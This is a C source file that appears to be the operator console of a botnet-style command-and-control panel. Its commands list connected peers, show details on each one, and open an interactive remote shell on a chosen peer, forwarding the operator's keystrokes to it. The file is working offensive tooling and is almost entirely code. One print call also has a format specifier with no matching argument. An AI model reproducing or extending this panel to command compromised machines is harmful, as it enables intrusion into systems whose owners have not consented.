#include <setjmp.h>

#include "lmem.h"
#include "sclient.h"
#include "speer.h"
#include "scmd.h"
#include "sterm.h"
#include "lerror.h"

#define CMD_ERROR(...) do { \
    PRINTTAG(TERM_BRIGHT_RED); \
    shellT_printf(__VA_ARGS__); \
    longjmp(cmdE_err, 1); \
} while(0);

jmp_buf cmdE_err;

/* ===================================[[ Helper Functions ]]==================================== */

tShell_cmdDef *shellS_findCmd(char *cmd);

tShell_peer *shellS_getPeer(tShell_client *client, int id) {
    if (id < 0 || id >= client->peerTblCount || client->peerTbl[id] == NULL)
        CMD_ERROR("Not a valid peer ID! [%d]\n", id);

    return client->peerTbl[id];
}

int shellS_readInt(char *str) {
    return atoi(str);
}

/* ===================================[[ Command Handlers ]]==================================== */

void helpCMD(tShell_client *client, int argc, char *argv[]);

void quitCMD(tShell_client *client, int argc, char *argv[]) {
    PRINTINFO("Killing socket...\n");
    laikaS_kill(&client->peer->sock);
}

void listPeersCMD(tShell_client *client, int argc, char *argv[]) {
    int i;

    for (i = 0; i < client->peerTblCount; i++) {
        if (client->peerTbl[i]) {
            shellT_printf("%04d ", i);
            shellP_printInfo(client->peerTbl[i]);
        }
    }
}

void infoCMD(tShell_client *client, int argc, char *argv[]) {
    tShell_peer *peer;
    int id;

    if (argc < 2)
        CMD_ERROR("Usage: info [PEER_ID]\n");

    id = shellS_readInt(argv[1]);
    peer = shellS_getPeer(client, id);

    /* print info */
    shellT_printf("%04d ", id);
    shellP_printInfo(peer);
}

void openShellCMD(tShell_client *client, int argc, char *argv[]) {
    uint8_t buf[LAIKA_SHELL_DATA_MAX_LENGTH];
    tShell_peer *peer;
    int id, sz, cols, rows;

    if (argc < 2)
        CMD_ERROR("Usage: shell [PEER_ID]\n");

    id = shellS_readInt(argv[1]);
    peer = shellS_getPeer(client, id);

    PRINTINFO("Opening shell on peer %04d...\n");
    PRINTINFO("Use CTRL+A to kill the shell\n");

    /* open shell on peer */
    shellT_getTermSize(&cols, &rows);
    shellC_openShell(client, peer, cols, rows);

    /* while client is alive, and our shell is open */
    while (laikaS_isAlive((&client->peer->sock)) && shellC_isShellOpen(client)) {
        /* poll for 50ms */
        if (!shellC_poll(client, 50)) {
            /* check if we have input! */
            if (shellT_waitForInput(0)) {
                /* we have input! send SHELL_DATA packet */
                sz = shellT_readRawInput(buf, sizeof(buf));
                if (sz <= 0) /* sanity check */
                    break;

                /* ctrl + a; kill shell */
                if (buf[0] == '\01')
                    shellC_closeShell(client);
                else
                    shellC_sendDataShell(client, buf, sz);
            }
        }
    }

    /* fix terminal */
    shellT_resetTerm();
    shellT_conioTerm();

    PRINTSUCC("Shell closed!\n");
}

/* =====================================[[ Command Table ]]===================================== */

#define CREATECMD(_cmd, _syntax, _help, _callback) ((tShell_cmdDef){.cmd = _cmd, .syntax = _syntax, .help = _help, .callback = _callback})

tShell_cmdDef shellS_cmds[] = {
    CREATECMD("help", "help", "Lists avaliable commands", helpCMD),
    CREATECMD("quit", "quit", "Disconnects from CNC, closing panel", quitCMD),
    CREATECMD("list", "list", "Lists all connected peers to CNC", listPeersCMD),
    CREATECMD("info", "info [PEER_ID]", "Lists info on a peer", infoCMD),
    CREATECMD("shell", "shell [PEER_ID]", "Opens a shell on peer", openShellCMD),
};

#undef CREATECMD

tShell_cmdDef *shellS_findCmd(char *cmd) {
    int i;

    /* TODO: make a hashmap for command lookup */
    for (i = 0; i < (sizeof(shellS_cmds)/sizeof(tShell_cmdDef)); i++) {
        if (strcmp(shellS_cmds[i].cmd, cmd) == 0)
            return &shellS_cmds[i]; /* cmd found */
    }

    return NULL;
}

void helpCMD(tShell_client *client, int argc, char *argv[]) {
    int i;

    shellT_printf("======= [[ %sCommand List%s ]] =======\n", shellT_getForeColor(TERM_BRIGHT_YELLOW), shellT_getForeColor(TERM_BRIGHT_WHITE));
    for (i = 0; i < (sizeof(shellS_cmds)/sizeof(tShell_cmdDef)); i++) {
        shellT_printf("'%s%s%s'\t- %s\n", shellT_getForeColor(TERM_BRIGHT_YELLOW), shellS_cmds[i].syntax, shellT_getForeColor(TERM_BRIGHT_WHITE), shellS_cmds[i].help);
    }
}

void shellS_initCmds(void) {
    /* stubbed for now, TODO: setup command hashmap */
}

void shellS_cleanupCmds(void) {
    /* stubbed for now, TODO: free command hashmap */
}

char **shellS_splitCmd(char *cmd, int *argSize) {
    int argCount = 0;
    int argCap = 4;
    char *temp;
    char **args = NULL;
    char *arg = cmd;

    do {
        /* replace space with NULL terminator */
        if (arg != cmd) {
            if (arg[-1] == '\\') { /* space is part of the argument */
                /* remove the '\' character */
                for (temp = arg-1; *temp != '\0'; temp++) {
                    temp[0] = temp[1];
                }
                arg++;
                continue;
            }
            *arg++ = '\0';
        }

        /* insert into our 'args' array */
        laikaM_growarray(char*, args, 1, argCount, argCap);
        args[argCount++] = arg;
    } while ((arg = strchr(arg, ' ')) != NULL); /* while we still have a delimiter */

    *argSize = argCount;
    return args;
}

void shellS_runCmd(tShell_client *client, char *cmd) {
    tShell_cmdDef *cmdDef;
    char **argc;
    int args;

    argc = shellS_splitCmd(cmd, &args);

    /* find cmd */
    if ((cmdDef = shellS_findCmd(argc[0])) == NULL) {
        shellT_printf("\nUnknown command '%s'!\n\n", cmd);
        return;
    }

    /* run command */
    shellT_printf("\n");
    if (setjmp(cmdE_err) == 0) {
        cmdDef->callback(client, args, argc);
    }

    /* free our argument buffer */
    laikaM_free(argc);
}
